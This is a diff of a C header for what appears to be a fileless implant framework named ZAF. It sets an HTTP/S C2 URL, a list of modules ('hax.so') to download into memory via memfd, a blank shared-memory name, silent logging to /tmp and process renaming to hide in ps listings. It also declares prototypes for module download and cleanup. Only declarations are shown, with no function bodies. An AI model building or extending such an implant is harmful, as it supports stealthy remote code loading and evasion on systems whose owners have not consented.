@@ -1,66 +1,45 @@
 // ZAF Header file
+#ifndef _HAVE_ZAF_H
+#define _HAVE_ZAF_H
 
-// logging 
+#include <stdio.h>
+#include <unistd.h>
+
 #include "log.h"
+#include "spt_status.h"
+
 #include "zstructs.h"
 #include "zsignals.h"
 #include "zmodules.h"
 #include "zservice.h"
 #include "zutil.h"
 
-// ps renaming
-#include "spt_status.h"
 
-#ifndef _HAVE_ZAF_H
-#define _HAVE_ZAF_H
-
-
-#define ZCURL_AGENT "libcurl-agent/1.0"    // UA-Agent
 #define ZLOG_LEVEL 1    
 #define ZPS_NAME "zaf"
 
 #define SHM_NAME " "                       // memfd:<...>
 
-// Global daemon log
+// ZAF log
 char *logFile="/tmp/_mf.log";              // Location of the log
-int logquiet = 1;                          // 1 - no stderr whatsoever, 0 - stderr + file
+int  logquiet = 1;                         // 1 - no stderr whatsoever, 0 - stderr + file
 FILE *fp;
 
 // Initial modules to download to memory
 char *modules[] = { "hax.so" };
-//
+
 // HTTP/S C2
 char *ccurl="http://127.0.0.1:8080/";
 
 
-
-
-/*** 
- *  Data structures 
- ***/
-
-
-// Kernel Verison: memfd_create support
-/*typedef struct {
-    int major;
-    int minor;
-    int memfd_supp;
-} memfd_kv;
-memfd_kv memfd_kv_s = {0,0,0};
-*/
-
-
-
-
-
-
-/*** 
- *  Functions
- ***/
+/***  Local Functions ***/
 int   setupCmdP(void);
 void  doWork(void);
+void  initSetup(void);
+void  downloadAutoModules(void);
 
-
+/***  Extern Functions ***/
+extern int   setKernel(void);
 extern int   check_empty(node_t * head);
 extern void  cleanup_mod_resources(int shm_fd);
 extern int   push(node_t * head, int shm_fd, char* path, char * mname, char * mstate);
